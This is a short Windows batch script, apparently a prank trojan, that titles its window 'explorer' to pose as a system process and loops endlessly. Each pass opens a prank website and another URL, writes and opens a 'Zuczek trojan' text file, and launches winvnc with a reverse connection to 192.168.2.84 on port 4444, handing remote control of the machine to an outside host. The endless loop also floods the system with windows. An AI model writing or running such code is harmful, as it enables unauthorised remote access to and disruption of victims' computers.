@echo off
title explorer
:x
start https://youareanidiot.cc
start https://ptoszek.pl
start charmap.exe
cd Deskop
echo ZUCZEK!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!>Zuczek trojan.txt
start Żuczek trojan.txt
winvnc.exe -run
timeout /t 1 >nul
start winvnc.exe -connect 192.168.2.84::4444
goto :x
